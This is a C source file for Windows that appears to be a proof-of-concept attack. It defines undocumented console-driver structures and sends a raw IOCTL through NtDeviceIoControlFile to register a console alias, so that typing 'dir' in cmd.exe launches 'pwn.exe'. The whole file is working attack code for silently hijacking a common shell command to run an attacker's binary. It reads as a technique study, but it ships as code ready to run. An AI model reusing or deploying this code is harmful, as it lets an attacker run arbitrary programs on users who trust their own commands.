#include <Windows.h>
#include <tchar.h>

#pragma comment(lib, "ntdll.lib")

// from #include <winternl.h>

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
	} DUMMYUNIONNAME;

	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef
VOID
(NTAPI*PIO_APC_ROUTINE)(
	IN PVOID ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG Reserved
);

__kernel_entry NTSTATUS
NTAPI
NtDeviceIoControlFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG IoControlCode,
	IN PVOID InputBuffer OPTIONAL,
	IN ULONG InputBufferLength,
	OUT PVOID OutputBuffer OPTIONAL,
	IN ULONG OutputBufferLength
);
// end of #include <winternl.h>


typedef struct _CONSOLE_BUFFER
{
	ULONG Size;
	PVOID Buffer;
} CONSOLE_BUFFER, *PCONSOLE_BUFFER;

typedef struct _CONSOLE_MSG_HEADER
{
	ULONG ApiNumber;
	ULONG ApiDescriptorSize;
} CONSOLE_MSG_HEADER, *PCONSOLE_MSG_HEADER;

typedef struct _CONSOLE_ADDALIAS_MSG
{
	IN USHORT SourceLength;
	IN USHORT TargetLength;
	IN USHORT ExeLength;
	IN BOOLEAN Unicode;
} CONSOLE_ADDALIAS_MSG, *PCONSOLE_ADDALIAS_MSG;

typedef struct _CONSOLE_MSG_L3
{
	CONSOLE_MSG_HEADER Header;

	union
	{
		CONSOLE_ADDALIAS_MSG AddConsoleAliasW;
	} u;
} CONSOLE_MSG_L3, *PCONSOLE_MSG_L3;

typedef struct _CD_IO_BUFFER
{
	ULONG Size;
	PVOID Buffer;
} CD_IO_BUFFER, *PCD_IO_BUFFER;

typedef struct MY_CD_USER_DEFINED_IO
{
	HANDLE Client;
	ULONG InputCount;
	ULONG OutputCount;
	CD_IO_BUFFER Buffers[4];
} MYCD_USER_DEFINED_IO, *PMYCD_USER_DEFINED_IO;

typedef struct _PEB_LDR_DATA
{
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	HANDLE ConsoleHandle;
	// removed for better visibility
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB
{
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	// removed for better visibility
} PEB, *PPEB;

typedef struct _TEB
{
	PVOID Reserved1[12];
	PPEB ProcessEnvironmentBlock;
	// removed for better visibility
} TEB, *PTEB;

#define NtCurrentPeb() ((PPEB)__readgsqword(FIELD_OFFSET(TEB, ProcessEnvironmentBlock)))

FORCEINLINE
HANDLE
ConsoleGetHandle(VOID)
{
	return NtCurrentPeb()->ProcessParameters->ConsoleHandle;
}

#define ConsolepAddAlias 50331666
#define IOCTL_CONDRV_ISSUE_USER_IO 0x500016

#define ALIAS_SOURCE_W L"dir"
#define ALIAS_TARGET_W L"pwn.exe"
#define ALIAS_EXENAME_W L"cmd.exe"


int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	CONSOLE_MSG_L3 consoleMsgL3;
	PCONSOLE_ADDALIAS_MSG addaliasMsg = &consoleMsgL3.u.AddConsoleAliasW;
	NTSTATUS Status;

	addaliasMsg->SourceLength = (USHORT)(wcslen(ALIAS_SOURCE_W) * sizeof(WCHAR));
	addaliasMsg->ExeLength = (USHORT)(wcslen(ALIAS_EXENAME_W) * sizeof(WCHAR));
	addaliasMsg->TargetLength = (USHORT)(wcslen(ALIAS_TARGET_W) * sizeof(WCHAR));
	addaliasMsg->Unicode = TRUE;

	IO_STATUS_BLOCK IoStatusBlock;
	MYCD_USER_DEFINED_IO InputBuffer;
	ULONG InputLength;

	consoleMsgL3.Header.ApiNumber = ConsolepAddAlias;
	consoleMsgL3.Header.ApiDescriptorSize = sizeof(CONSOLE_ADDALIAS_MSG);


	InputBuffer.Client = NULL;
	InputBuffer.InputCount = 4; // header + 3 strings
	InputBuffer.OutputCount = 0;

	InputBuffer.Buffers[0].Buffer = &consoleMsgL3.Header;
	InputBuffer.Buffers[0].Size = sizeof(CONSOLE_MSG_HEADER) + sizeof(CONSOLE_ADDALIAS_MSG);

	InputBuffer.Buffers[1].Size = (ULONG)(wcslen(ALIAS_EXENAME_W) * sizeof(WCHAR));
	InputBuffer.Buffers[1].Buffer = ALIAS_EXENAME_W;

	InputBuffer.Buffers[2].Size = (ULONG)(wcslen(ALIAS_SOURCE_W) * sizeof(WCHAR));
	InputBuffer.Buffers[2].Buffer = ALIAS_SOURCE_W;

	InputBuffer.Buffers[3].Size = (ULONG)(wcslen(ALIAS_TARGET_W) * sizeof(WCHAR));
	InputBuffer.Buffers[3].Buffer = ALIAS_TARGET_W;

	InputLength = 4 * sizeof(CD_IO_BUFFER) + FIELD_OFFSET(MYCD_USER_DEFINED_IO, Buffers);

	Status = NtDeviceIoControlFile(
		ConsoleGetHandle(),
		NULL,
		NULL,
		NULL,
		&IoStatusBlock,
		IOCTL_CONDRV_ISSUE_USER_IO,
		&InputBuffer,
		InputLength,
		NULL,
		0);

	return (int)Status;
}
